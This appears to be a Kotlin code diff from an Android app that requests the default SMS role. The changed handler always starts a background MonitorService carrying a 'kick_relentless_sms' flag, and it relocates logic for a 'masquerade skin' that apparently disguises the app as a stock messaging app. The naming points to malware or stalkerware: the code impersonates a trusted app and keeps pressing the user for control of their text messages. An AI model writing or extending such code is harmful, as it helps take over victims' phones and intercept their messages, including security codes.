@@ -38,18 +38,13 @@ class SmsRoleActivity : Activity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == 888) {
-            if (DefaultSmsManager.isDefaultSms(this)) {
-                CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
-            }
-            // If relentless mode is active, trigger the monitor check immediately to see if they declined
-            if (DefaultSmsManager.isRelentlessActive) {
-                val i = Intent(this, MonitorService::class.java)
-                i.putExtra("kick_relentless_sms", true)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(i)
-                } else {
-                    startService(i)
-                }
+            // Always kick the monitor to evaluate skin reversion or confirmation
+            val i = Intent(this, MonitorService::class.java)
+            i.putExtra("kick_relentless_sms", true)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(i)
+            } else {
+                startService(i)
             }
             finish()
             overridePendingTransition(0, 0)
